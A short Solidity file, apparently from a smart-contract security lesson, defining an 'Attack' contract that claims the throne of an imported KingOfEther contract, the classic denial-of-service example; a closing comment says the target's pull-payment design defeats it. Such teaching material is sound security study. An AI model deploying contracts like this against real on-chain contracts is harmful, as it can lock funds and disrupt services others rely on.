// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

import "./KingOfEther.sol";

contract Attack {

    KingOfEther kingOfEther;

    constructor(address _kingOfEther) payable {
        kingOfEther = KingOfEther(_kingOfEther);
    }
    
    function attack () public payable {
        kingOfEther.claimThrone{value:msg.value}();
    }

}

// this is the pull method
// this way the attack contract cannot pose a DOS attack of this contract
